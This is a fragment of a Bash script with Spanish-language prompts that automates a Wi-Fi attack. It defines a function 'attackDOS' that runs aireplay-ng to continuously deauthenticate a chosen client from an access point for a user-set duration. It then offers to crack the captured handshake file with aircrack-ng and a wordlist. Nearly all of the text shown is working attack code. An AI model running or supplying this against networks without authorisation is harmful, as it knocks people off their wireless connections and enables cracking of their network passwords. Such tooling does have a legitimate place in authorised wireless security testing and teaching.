...
function attackDOS(){
	...
	echo -en "\t${yellowColour}Duracion (s): ${endColour}" && read num
	sleep 1; kill -9 $xtermAirodump_AP_PID; wait $xtermAirodump_AP_PID 2>/dev/null
	
	xterm -hold -e "aireplay-ng -0 0 -a $BSSID -c $ST ${networkCard}mon 2>/dev/null" 2>/dev/null &
	xtermAireplayPIB=$!

	sleep $num; kill -9 $xtermAireplayPIB; wait $xtermAireplayPIB 2>/dev/null
	
	echo -en "\t${yellowColour}Deseas realizar un [Handshake Attack] (y/n): ${endColour}" && read mode
	echo -en "\t${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic
        
	if [ "$mode" == "y" ]; then
                xterm -hold -e "aircrack-ng -w $ruteDic Captura-01.cap" 2>/dev/null&
        else
                ctrl_c
        fi
